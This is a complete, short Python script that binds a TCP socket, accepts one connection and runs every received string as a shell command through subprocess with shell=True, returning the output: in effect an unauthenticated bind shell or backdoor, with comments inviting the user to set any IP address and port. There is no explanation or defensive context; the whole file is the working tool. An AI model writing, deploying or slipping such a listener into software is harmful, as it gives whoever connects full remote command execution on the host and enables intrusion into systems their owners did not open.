import socket
import subprocess

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='utf-8')
    except subprocess.CalledProcessError as e:
        output = str(e.output)
    return output

def main():
    host = '127.0.0.1'  # Change this to your desired IP address
    port = 12345        # Change this to your desired port number

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"[*] Listening on {host}:{port}")

        client_socket, client_address = server_socket.accept()
        print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

        while True:
            try:
                command = client_socket.recv(1024).decode()
                if not command:
                    break

                output = execute_command(command)
                client_socket.send(output.encode())
            except Exception as e:
                print(f"[-] Error: {e}")
                break

        client_socket.close()

if __name__ == "__main__":
    main()
